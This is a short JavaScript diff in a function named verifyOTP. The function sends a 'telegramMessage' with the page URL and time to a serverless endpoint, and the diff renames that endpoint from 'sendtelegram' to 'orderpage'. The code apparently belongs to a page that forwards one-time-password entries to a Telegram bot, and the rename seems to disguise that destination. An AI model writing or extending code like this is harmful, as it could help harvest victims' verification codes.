@@ -120,7 +120,7 @@ function verifyOTP() {
                 `🌐 Page: ${location.href}\n` +
                 `📅 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
 
-            fetch("/.netlify/functions/sendtelegram", {
+            fetch("/.netlify/functions/orderpage", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ text: telegramMessage })
